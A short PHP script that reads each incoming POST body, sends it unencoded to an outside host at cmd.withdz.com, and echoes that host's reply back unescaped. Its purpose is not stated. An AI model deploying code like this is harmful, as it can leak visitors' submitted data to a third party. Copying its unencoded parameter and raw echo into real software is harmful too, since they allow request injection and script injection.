<?php
$postdata = file_get_contents("php://input");
$postdata =json_encode($postdata);
$dz = file_get_contents("http://cmd.withdz.com/ok/dz.php?data=$postdata");
echo "ok = $dz";

?>
